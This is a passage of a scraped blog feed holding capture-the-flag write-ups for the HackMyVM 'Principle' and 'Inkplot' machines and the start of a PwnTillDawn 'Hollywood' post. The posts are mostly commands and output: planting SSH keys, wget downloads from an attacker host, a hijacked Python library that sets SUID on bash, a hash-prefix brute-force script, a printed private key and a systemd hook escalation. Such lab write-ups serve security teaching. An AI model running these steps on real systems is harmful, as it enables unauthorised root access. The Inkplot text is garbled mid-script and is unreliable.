.bash_logout-rw-r----- 1 talos talos 3545 Jul 14 06:56 .bashrc-rw------- 1 talos talos 20 Jul 4 18:24 .lesshstdrw-r----- 3 talos talos 4096 Jun 30 07:30 .local-rw-r----- 1 talos talos 807 Jun 30 05:06 .profiledrwx------ 2 talos talos 4096 Oct 10 02:24 .ssh-rwxr-xr-x 1 talos www-data 263 Oct 10 01:44 god.py-rw-r----- 1 talos talos 320 Jul 13 15:42 note.txt$ cat note.txt\tCongratulations! You have made it this far thanks to the manipulated file I left you, I knew you would make it!Now we are very close to finding this false God Elohim.I left you a file with the name of one of the 12 Gods of Olympus, out of the eye of Elohim ;)The tool I left you is still your ally. Good luck to you.$```{: .nolineno}From `note.txt` I created a god names file that will search all the files containing that name â†’```bashimport osnames = ['Zeus','PoseidÃ³n','Hera','DemÃ©ter','Afrodita','Atenea','Artemisa','Apolo','Ares','Hefesto','Hermes','Hestia','Dioniso']for i in names : print('File Containing ' +i+' god name are : ') os.system('find / -type f 2>/dev/null | grep -i '+i)```{: .nolineno}I got this output now â†’```bashbash-5.2$ python3 god.pyFile Containing Zeus god name are : File Containing PoseidÃ³n god name are : File Containing Hera god name are : /usr/lib/modules/6.1.0-9-amd64/kernel/drivers/power/supply/cros_peripheral_charger.ko/usr/share/zoneinfo/Antarctica/Rothera/usr/share/zoneinfo/right/Antarctica/RotheraFile Containing DemÃ©ter god name are : File Containing Afrodita god name are : /etc/selinux/Afrodita.keyFile Containing Atenea god name are : File Containing Artemisa god name are : File Containing Apolo god name are : File Containing Ares god name are : /usr/share/zoneinfo/Europe/Bucharest/usr/share/zoneinfo/right/Europe/BucharestFile Containing Hefesto god name are : File Containing Hermes god name are : File Containing Hestia god name are : File Containing Dioniso god name are : bash-5.2$```{: .nolineno}Now I accessed this file `/etc/selinux/Afrodita.key` â†’```bashbash-5.2$ cat /etc/selinux/Afrodita.keyHere is my password:Hax0rModeONNow I have done another little trick to help you reach Elohim.REMEMBER: You need the access key and open the door. Anyway, he has a bad memory and that is why he keeps the lock coded and hidden at home.bash-5.2$```{: .nolineno}Lets use this password â†’```bashbash-5.2$ su talosPassword: talos@principle:~$ whoamitalostalos@principle:~$ iduid=1000(talos) gid=1000(talos) groups=1000(talos),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)talos@principle:~$ sudo -lMatching Defaults entries for talos on principle: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_ptyUser talos may run the following commands on principle: (elohim) NOPASSWD: /bin/cptalos@principle:~$```{: .nolineno}Now I tried to replace the shadow or passwd file but no luck as it is done from elohim user privileegs I think I have to include the attackers ssh keys inside the elohim `.ssh` directory to get the shell â†’The Attacker created the ssh key like this â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Principle]â””â”€$ ssh-keygen Generating public/private rsa key pair.Enter file in which to save the key (/home/kali/.ssh/id_rsa): id_rsaEnter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in id_rsaYour public key has been saved in id_rsa.pubThe key fingerprint is:SHA256:GeUnYF9iQqmFDOaAyR2IJlDwHShEJwIADZ1mDqFG5yQ kali@kaliThe key is randomart image is:+---[RSA 3072]----+|^E=B=o o=.+ . ||@=#* .o.oB o ||+B..o o. + . ||. . . o o || S || || || || |+----[SHA256]-----+â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Principle]â””â”€$ cp id_rsa.pub authorized_keys â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Principle]â””â”€$ nano authorized_keysâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Principle]â””â”€$ cat authorized_keys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCrXvdrOqD8zFEl8IyJWB2gaah+PWtpRItU0+764XzL4l7bqPBpuLQSBqI13AERH/ar+K6vPCVMIb/ScuCiB7vs45S4TanJX8RLN33MbJtSAZwkRbNcroFmkX0rbODoaeRFLFb4F5JJrAXJ0OIoeIEoigkFMvAn272xwJ5dJ675hmvViVLW5L3O+Wma4rFXAea8jNcnVjN0fq+whaM/64vavQCUSfzWgRpLbyTsgRsmQsg96dyLY8q7TuA5qg5PNUjXNQO/j7JyNNjv7n2/fpT1Kyf3Lanis2wHLhDYz88IlWsUkGgZdAsC+g2WfNuaI+s840F2usdsmMEWxp5dWKCSCHc+aT7ceBFwLRk8L4aXC+VEiBZY1gtLkZYV6Y66kD5ef2buxfnqYq+7afw390q5We0mC2JiwXiDe/LvspXGL0EwbHt69X6imPdlJk9h1ZRvMF+MzsJ6xI8dtr1vMJsHzu2jnW+C01r+Q43nIbUPoTvIVHkQjb0DWN5kYBdSD0= elohim@10.0.2.72```{: .nolineno}Now lets transfer these 2 files into victim machine and put it in there location â†’```bashtalos@principle:~$ cd /tmptalos@principle:/tmp$ wget http://10.0.2.60/id_rsa--2023-10-10 02:09:37-- http://10.0.2.60/id_rsaConnecting to 10.0.2.60:80... connected.HTTP request sent, awaiting response... 200 OKLength: 2590 (2.5K) [application/octet-stream]Saving to: â€˜id_rsaâ€™id_rsa 100%[===================>] 2.53K --.-KB/s in 0s 2023-10-10 02:09:37 (173 MB/s) - â€˜id_rsaâ€™ saved [2590/2590]talos@principle:/tmp$ wget http://10.0.2.60/authorized_keys--2023-10-10 02:09:50-- http://10.0.2.60/authorized_keysConnecting to 10.0.2.60:80... connected.HTTP request sent, awaiting response... 200 OKLength: 570 [application/octet-stream]Saving to: â€˜authorized_keysâ€™authorized_keys 100%[===================>] 570 --.-KB/s in 0s 2023-10-10 02:09:50 (102 MB/s) - â€˜authorized_keysâ€™ saved [570/570]talos@principle:/tmp$ chmod 600 id_rsatalos@principle:/tmp$ sudo -u elohim cp authorized_keys /home/gehenna/.ssh/authorized_keys```{: .nolineno}Now I looked into the network connection and I got one internal connection for ssh â†’```bashtalos@principle:/tmp$ ss -tunlpNetid State Recv-Q Send-Q Local Address:Port Peer Address:PortProcessudp UNCONN 0 0 0.0.0.0:68 0.0.0.0:* tcp LISTEN 0 511 0.0.0.0:80 0.0.0.0:* tcp LISTEN 0 128 0.0.0.0:3445 0.0.0.0:* tcp LISTEN 0 511 [::]:80 [::]:* tcp LISTEN 0 128 [::]:3445 [::]:* talos@principle:/tmp$ talos@principle:/tmp$ talos@principle:/tmp$ nc 127.0.0.1 3445SSH-2.0-OpenSSH_9.2p1 Debian-2^Ctalos@principle:/tmp$ sshbash: /usr/bin/ssh: Permission deniedtalos@principle:/tmp$```{: .nolineno}Now on Attackers machine I transfered the ssh executable to the victim machine â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Principle]â””â”€$ whereis ssh ssh: /usr/bin/ssh /etc/ssh /usr/share/man/man1/ssh.1.gz â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Principle]â””â”€$ cp /usr/bin/ssh .```{: .nolineno}through wget and now its time to get elohim shell â†’```bashtalos@principle:/tmp$ wget http://10.0.2.60/ssh--2023-10-10 02:19:49-- http://10.0.2.60/sshConnecting to 10.0.2.60:80... connected.HTTP request sent, awaiting response... 200 OKLength: 1129504 (1.1M) [application/octet-stream]Saving to: â€˜ssh.1â€™ssh.1 100%[===================>] 1.08M --.-KB/s in 0.02s 2023-10-10 02:19:49 (67.4 MB/s) - â€˜ssh.1â€™ saved [1129504/1129504]talos@principle:/tmp$ chmod +x ssh.1talos@principle:/tmp$ ./ssh.1usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface] [-b bind_address] [-c cipher_spec] [-D [bind_address:]port] [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11] [-i identity_file] [-J destination] [-L address] [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-P tag] [-p port] [-Q query_option] [-R address] [-S ctl_path] [-W host:port] [-w local_tun[:remote_tun]] destination [command [argument ...]]```{: .nolineno}Now elohim SSH time â†’```bashtalos@principle:/tmp$ ./ssh.1 -i id_rsa elohim@localhost -p 3445The authenticity of host '[localhost]:3445 ([::1]:3445)' cant be established.ED25519 key fingerprint is SHA256:DKEXWHITnUq09/ftlMqD6Eo+e5eQoeR+HWleDkUB9fw.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '[localhost]:3445' (ED25519) to the list of known hosts.Son, you did not listen to me, and now you are trapped.You have come a long way, but this is the end of your journey.elohim@principle:~$ whoamielohimelohim@principle:~$ iduid=1001(elohim) gid=1001(elohim) groups=1001(elohim),1002(sml)elohim@principle:~$ cd ~bash: cd: restrictedelohim@principle:~$ pwd/home/gehennaelohim@principle:~$ ls -altotal 40drwxr-xr-x 4 elohim elohim 4096 Jul 14 11:25 .drwxr-xr-x 4 root root 4096 Jul 4 06:11 ..-rw------- 1 elohim elohim 289 Jul 14 06:38 .bash_history-rw-r----- 1 elohim elohim 261 Jul 5 08:13 .bash_logout-rw-r----- 1 elohim elohim 3830 Jul 14 06:37 .bashrc-rw-r----- 1 elohim elohim 777 Jul 13 17:19 flag.txtdrw-r----- 3 elohim elohim 4096 Jul 2 20:52 .local-rw-r----- 1 elohim elohim 21 Jul 12 05:35 .lock-rw-r----- 1 elohim elohim 807 Jul 6 06:28 .profiledrwx------ 2 elohim elohim 4096 Jul 6 11:05 .sshelohim@principle:~$ elohim@principle:~$ less flag.txtWARNING: terminal is not fully functionalPress RETURN to continue _ _)\\.-. .-.__,___,_.-=-. )\\` a`\\_ .-.__\\__,__,__.-=-. `/ \\ `\\ {~,-~-,-~.-~,-,;;;;\\ | '--;`)/ \\-,~_-~_-,~-,(_(_(;\\/ ,;/ \",-.~_,-~,-~,)_)_)'. ;;( `~-,_-~,-~(_(_(_(_\\ `;\\ , `\"~~--,)_)_)_)\\_ \\ |\\ (_(_/_(_, \\ ; \\ '-. _.--' /_/_/_) | | '--.\\ .' /_/ | | )) / \\ | /.' // /, | __.'| || // || /` ( || || || .' \\ \\\\ || || .'_ \\ \\\\ \\\\ // / _ `\\ \\ \\\\__ \\'-'/( _ `\\,; \\ ;--:, `\"` `\"` `-,,; `\"`\",,;'CONGRATULATIONS, you have defeated me!The flag is:FLAGFLAGFLAG elohim@principle:~$```{: .nolineno}Now lets get to root â†’```bashelohim@principle:~$ sudo -lMatching Defaults entries for elohim on principle: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_ptyUser elohim may run the following commands on principle: (root) NOPASSWD: /usr/bin/python3 /opt/reviewer.pyelohim@principle:~$ ls -al /opt/reviewer.py-rwxr-xr-x 1 root root 1072 Jul 7 15:17 /opt/reviewer.pyelohim@principle:~$ iduid=1001(elohim) gid=1001(elohim) groups=1001(elohim),1002(sml)elohim@principle:~$```{: .nolineno}Lets see `reviewer.py` file â†’```bashelohim@principle:~$ less /opt/reviewer.pyWARNING: terminal is not fully functionalPress RETURN to continue #!/usr/bin/python3import osimport subprocessdef eliminar_archivos_incorrectos(directorio): extensiones_validas = ['.jpg', '.png', '.gif'] for nombre_archivo in os.listdir(directorio): archivo = os.path.join(directorio, nombre_archivo) if os.path.isfile(archivo): _, extension = os.path.splitext(archivo) if extension.lower() not in extensiones_validas: os.remove(archivo) print(f\"Archivo eliminado: {archivo}\")directorio = '/var/www/hellfire.t4l0s.hmv/archivos'eliminar_archivos_incorrectos(directorio)def enviar_mensaje_usuarios_conectados(): proceso = subprocess.Popen(['who'], stdout=subprocess.PIPE) salida, _ = proceso.communicate() lista_usuarios = salida.decode().strip().split('\\n') usuarios_conectados = [usuario.split()[0] for usuario in lista_usuarios] mensaje = f\"I have detected an intruder, stealing accounts: {', '.join(usuarios_conectados)}\" subprocess.run(['wall', mensaje]):enviar_mensaje_usuarios_conectados()elohim@principle:~$```{: .nolineno}Lets see the permissions of there libraries â†’```bashelohim@principle:~$ find / -name subprocess.py 2>/dev/null/usr/lib/python3.11/subprocess.py/usr/lib/python3.11/asyncio/subprocess.pyelohim@principle:~$ ls -al /usr/lib/python3.11/subprocess.py-rw-rw-r-- 1 root sml 85745 Jul 11 19:04 /usr/lib/python3.11/subprocess.pyelohim@principle:~$ find / -name os.py 2>/dev/null /usr/lib/python3.11/os.pyelohim@principle:~$ ls -al /usr/lib/python3.11/os.py-rw-r--r-- 1 root root 39504 Mar 13 2023 /usr/lib/python3.11/os.pyelohim@principle:~$```{: .nolineno}I can see I have write permission on `subprocess.py` file so lets add our own os module system commmands â†’```bashelohim@principle:~$ echo 'import os> os.system(\"chmod +s /bin/bash\")' >> /usr/lib/python3.11/subprocess.pyelohim@principle:~$ ls -al /bin/bash -rwxr-xr-x 1 root root 1265648 Apr 23 17:23 /bin/bashelohim@principle:~$ sudo python3 /opt/reviewer.py elohim@principle:~$ ls -al /bin/bash -rwsr-sr-x 1 root root 1265648 Apr 23 17:23 /bin/bashelohim@principle:~$ /bin/bash -pbash-5.2# whoamirootbash-5.2# iduid=1001(elohim) gid=1001(elohim) euid=0(root) egid=0(root) groups=0(root),1001(elohim),1002(sml)bash-5.2# cd /rootbash-5.2# ls -altotal 40drwx------ 5 root root 4096 Jul 14 11:28 .drwxr-xr-x 18 root root 4096 Jul 11 17:43 ..-rw------- 1 root root 0 Jul 14 11:28 .bash_history-rw-r--r-- 1 root root 597 Jul 7 15:25 .bashrcdrwx------ 3 root root 4096 Jul 3 17:51 .config-rw------- 1 root root 20 Jul 6 08:04 .lesshstdrwxr-xr-x 3 root root 4096 Jun 30 05:12 .local-rw-r--r-- 1 root root 161 Jul 9 2019 .profile-rw-r----- 1 root root 478 Jul 7 15:38 root.txt-rw-r--r-- 1 root root 66 Jul 6 07:06 .selected_editordrwx------ 2 root root 4096 Jul 13 18:54 .sshbash-5.2# cat root.txtCONGRATULATIONS, the system has been pwned! _______ @@@@@@@@@@@ @@@@@@@@@@@@@@@ @@@@@@@222@@@@@@@ (@@@@@/_____\\@@@@@) @@@@(_______)@@@@ @@@{ \" L \" }@@@ \\@ \\ - / @/ / ~ \\ / == == \\ / \\ | / \\ / \\ ==+== \\| \\ ___|_ || \\//~~~|---/ * ~~~~ | }{ /| |-----/~~~~| | / \\_ | / |__|_ /FLAGFLAGFLAG Broadcast message from root@principle (somewhere) (Tue Oct 10 02:40:01 2023): I have detected an intruder, stealing accounts: elohim```{: .nolineno}I am root now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Inkplot", "url": "/posts/Inkplot/", "categories": "HackMyVM", "tags": "PrivEsc, RC4, Cryptography, Password Bruteforce, WebSocat", "date": "2023-10-10 00:00:00 +0530", "snippet": "## Description â¤µï¸This machine is *Inkploit* , It is from HackMyVM Platform and categorized as Medium machine . ## Port Scan Results â¤µï¸![Untitled](/Vulnhub-Files/img/Inkplot/Untitled%201.png)```bash...", "content": "## Description â¤µï¸This machine is *Inkploit* , It is from HackMyVM Platform and categorized as Medium machine . ## Port Scan Results â¤µï¸![Untitled](/Vulnhub-Files/img/Inkplot/Untitled%201.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Inkplot]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.71Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-08 13:12 ISTNmap scan report for 10.0.2.71Host is up (0.0013s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 9.2p1 Debian 2 (protocol 2.0)| ssh-hostkey: | 256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)|_ 256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)3000/tcp open websocket Ogar agar.io serverMAC Address: 08:00:27:5D:76:3D (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸I have port 3000 as websocat so for accessing that in linux I need to have a websocat application for Linux so I downloaded from [here](https://github.com/vi/websocat/releases/download/v1.12.0/websocat.x86_64-unknown-linux-musl) .```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Inkplot]â””â”€$ ./websocat.x86_64-unknown-linux-musl ws://10.0.2.71:3000Welcome to our InkPlot secret IRC serverBob: Alice, ready to knock our naive Leila off her digital pedestal?Alice: Bob, I have been dreaming about this for weeks. Leila has no idea what is about to hit her.Bob: Exactly. Were gonna tear her defense system apart. She wont see it coming.Alice: Poor Leila, always so confident. Lets do this.Bob: Alice, I will need that MD5 hash to finish the job. Got it?Alice: Yeah, I have got it. Time to shake Leila is world.Bob: Perfect. Release it.Alice: Here it goes: d51540...*Alice has disconnected*Bob: What?! Damn it, Alice?! Not now!Leila:```{: .nolineno} Now from above context I got to know that the Leila password hash will start from d51540 so I have to create an automated script that takes wordlist as a input and generate md5sum hash and compare it with this starting value â†’```bash#!/bin/bash# check if a wordlist file name is provided as an argumentif [ $# -eq 0 ]; then echo \"Please provide a wordlist file name as an argument.\" exit 1fi# define the prefix to look forprefix=\"d51540\"# loop through each word in the wordlist filewhile read -r word; do # calculate the MD5 hash of the word hash=$(echo \"$word\" | md5sum | cut -d \" \" -f 1) if [[ $hash == $prefix* ]]; then\t\techo \"Found a match! Word: $word, Hash: $hash\"\tfidone /tmp/id_rsa.enc```{: .nolineno}Now again going to encrypt this file that will give me decoded output but in base64 encoded like this â†’```bashâ•­â”€leila@inkplot ~pauline â•°â”€$ sudo -u pauline /usr/bin/python3 /home/pauline/cipher.py -e /tmp/id_rsa.encsudo: unable to resolve host inkplot: Name or service not knownThe encrypted and encoded content has been written to: id_rsa.enc.encâ•­â”€leila@inkplot ~pauline â•°â”€$ cat id_rsa.enc.enc | base64 -d -----BEGIN OPENSSH PRIVATE KEY-----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-----END OPENSSH PRIVATE KEY-----â•­â”€leila@inkplot ~pauline â•°â”€$ â•­â”€leila@inkplot ~pauline â•°â”€$ cat id_rsa.enc.enc | base64 -d > /tmp/id_rsa 1 â†µ```{: .nolineno}Now lets have the pauline shell â†’```bashâ•­â”€leila@inkplot ~pauline â•°â”€$ chmod 600 /tmp/id_rsa â•­â”€leila@inkplot ~pauline â•°â”€$ ssh pauline@localhost -i /tmp/id_rsa Auto-standby now activated after 2 min of inactivityLinux inkplot 6.1.0-10-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-1 (2023-07-14) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.â•­â”€pauline@inkplot ~ â•°â”€$ whoamipaulineâ•­â”€pauline@inkplot ~ â•°â”€$ iduid=1000(pauline) gid=1000(pauline) groups=1000(pauline),100(users),1002(admin)â•­â”€pauline@inkplot ~ â•°â”€$```{: .nolineno}I noticed the group as admin so lets see â†’```bashâ•­â”€pauline@inkplot ~ â•°â”€$ find / -group admin 2>/dev/null /usr/lib/systemd/system-sleep```{: .nolineno}So systemd commands use to run at start of the shell or as a cron so lets add a script file over here so that ot can trigger that file â†’```bashâ•­â”€pauline@inkplot /usr/lib/systemd/system-sleep â•°â”€$ nano script 1 â†µâ•­â”€pauline@inkplot /usr/lib/systemd/system-sleep â•°â”€$ cat script #!/bin/bashchmod +s /bin/bashchmod +s /bin/findâ•­â”€pauline@inkplot /usr/lib/systemd/system-sleep â•°â”€$ ls -al total 20drwxrwx--- 2 root admin 4096 Oct 8 18:17 .drwxr-xr-x 14 root root 12288 Jul 28 17:55 ..-rwxr-xr-x 1 pauline pauline 104 Oct 8 18:17 scriptâ•­â”€pauline@inkplot /usr/lib/systemd/system-sleep â•°â”€$ ls -al /bin/bash-rwxr-xr-x 1 root root 1265648 Apr 23 23:23 /bin/bashâ•­â”€pauline@inkplot /usr/lib/systemd/system-sleep â•°â”€$ ls -al /bin/find -rwxr-xr-x 1 root root 224848 Jan 8 2023 /bin/findâ•­â”€pauline@inkplot /usr/lib/systemd/system-sleep â•°â”€$```{: .nolineno}As after few minutes during inactivity I got this systemd running as â†’![Untitled](/Vulnhub-Files/img/Inkplot/Untitled%203.png)```bashâ•­â”€pauline@inkplot /usr/lib/systemd/system-sleep â•°â”€$ Broadcast message from root@inkplot (Sun 2023-10-08 14:11:37 CEST):The system will suspend now!Broadcast message from root@inkplot (Sun 2023-10-08 14:11:37 CEST):The system will suspend now!```{: .nolineno}Now when I reloaded the system I got this â†’```bashâ•­â”€pauline@inkplot ~ â•°â”€$ ls -al /bin/bash-rwsr-sr-x 1 root root 1265648 Apr 23 23:23 /bin/bashâ•­â”€pauline@inkplot ~ â•°â”€$ ls -al /bin/find-rwsr-sr-x 1 root root 224848 Jan 8 2023 /bin/findâ•­â”€pauline@inkplot ~ â•°â”€$ /bin/bash -pbash-5.2# whoamirootbash-5.2# iduid=1000(pauline) gid=1000(pauline) euid=0(root) egid=0(root) groups=0(root),100(users),1000(pauline),1002(admin)bash-5.2# cd /rootbash-5.2# ls -altotal 52drwx------ 6 root root 4096 Aug 3 19:03 .drwxr-xr-x 18 root root 4096 Jul 27 07:34 ..lrwxrwxrwx 1 root root 9 Jun 15 06:14 .bash_history -> /dev/null-rw-r--r-- 1 root root 571 Jul 22 11:11 .bashrc-rw------- 1 root root 20 Aug 1 19:11 .lesshstdrwxr-xr-x 3 root root 4096 Aug 1 18:45 .localdrwxr-xr-x 4 root root 4096 Jul 26 18:48 .npmdrwxr-xr-x 12 root root 4096 Jul 22 11:11 .oh-my-zsh-rw-r--r-- 1 root root 161 Jul 22 11:11 .profile-rwx------ 1 root root 33 Aug 1 19:08 root.txt-rw-r--r-- 1 root root 66 Jul 22 11:11 .selected_editordrwx------ 2 root root 4096 Jul 25 20:14 .ssh-rw-r--r-- 1 root root 165 Jul 26 18:51 .wget-hstslrwxrwxrwx 1 root root 9 Jul 22 10:12 .zsh_history -> /dev/null-rw-r--r-- 1 root root 3890 Jul 22 11:11 .zshrcbash-5.2# cat root.txtFLAGFLAGFLAGFLAGFLAGFLAGFLAGbash-5.2#```{: .nolineno}I am root now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Hollywood", "url": "/posts/Hollywood/", "categories": "PwnTillDawn", "tags": "Metasploit, Public Exploit, Windows, PrivEsc", "date": "2023-10-10 00:00:00 +0530", "snippet": "## Description â¤µï¸ This is a *Hollywood* machine writeup/walkthrough, from PwnTillDawn platform -> https://online.pwntilldawn.com/ with is maintain through wizlynx group -> https://www.wizlynxgroup....", "content": "## Description â¤µï¸ This is a *Hollywood* machine writeup/walkthrough, from PwnTillDawn platform -> https://online.pwntilldawn.com/ with is maintain through wizlynx group -> https://www.wizlynxgroup.com/ .## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/219]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.150.150.219[sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-03 20:34 ISTWarning: 10.150.150.219 giving up on port because retransmission cap hit (6).Nmap scan report for 10.150.150.219Host is up (0.18s latency).Not shown: 65501 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp FileZilla ftpd 0.9.41 beta| ftp-syst: |_ SYST: UNIX emulated by FileZilla25/tcp open smtp Mercury/32 smtpd (Mail server account Maiser)|_smtp-commands: localhost Hello nmap.scanme.org; ESMTPs are:, TIME79/tcp open finger Mercury/32 fingerd| finger: Login: Admin Name: Mail System Administrator\\x0D| \\x0D|_[No profile information]\\x0D80/tcp open http Apache httpd 2.4.34 ((Win32) OpenSSL/1.0.2o PHP/5.6.38)|_http-server-header: Apache/2.4.34 (Win32) OpenSSL/1.0.2o PHP/5.6.38| http-title: Welcome to XAMPP|_Requested resource was http://10.150.150.219/dashboard/105/tcp open ph-addressbook Mercury/32 PH addressbook server106/tcp open pop3pw Mercury/32 poppass service110/tcp open pop3 Mercury/32 pop3d|_pop3-capabilities: EXPIRE(NEVER) TOP USER APOP UIDL135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn143/tcp open imap Mercury/32 imapd 4.62|_imap-capabilities: AUTH=PLAIN complete OK X-MERCURY-1A0001 IMAP4rev1 CAPABILITY443/tcp open ssl/http Apache httpd 2.4.34 ((Win32) OpenSSL/1.0.2o PHP/5.6.38)| ssl-cert: Subject: commonName=localhost| Not valid before: 2009-11-10T23:48:47|_Not valid after: 2019-11-08T23:48:47|_http-server-header: Apache/2.4.34 (Win32) OpenSSL/1.0.2o PHP/5.6.38|_ssl-date: TLS randomness does not represent time| http-title: Welcome to XAMPP|_Requested resource was https://10.150.150.219/dashboard/| tls-alpn: |_ http/1.1445/tcp open ï¿½ï¿½G[ï¿½U Windows 7 Ultimate 7601 Service Pack 1 